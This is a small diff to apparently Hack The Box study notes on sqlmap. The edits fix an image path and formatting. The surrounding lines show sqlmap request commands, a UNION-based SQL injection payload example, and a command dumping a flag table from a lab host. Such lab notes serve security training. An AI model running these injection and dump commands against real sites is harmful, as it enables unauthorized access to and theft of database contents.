@@ -2,7 +2,7 @@
 
 ## Curl Commands
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (867).png" alt=""><figcaption></figcaption></figure>
 
 ```shell-session
 eldeim@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
@@ -67,7 +67,7 @@ To end, we have a sqli JSON, yeah... Something inusual
 
 ## Attack Tuning
 
-&#x20;Every payload sent to the target consists of:
+Every payload sent to the target consists of:
 
 * vector (e.g., `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
 * boundaries (e.g. `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.
@@ -124,4 +124,3 @@ sqlmap -u "http://94.237.59.174:43464/case7.php?id=1" --union-cols=5 --technique
 ##dump
 sqlmap -u "http://94.237.59.174:43464/case7.php?id=1" --union-cols=5 --technique=U --dbms=mysql --level=5 --risk=3 --batch --random-agent -D testdb -T flag7 --dump
 ```
-
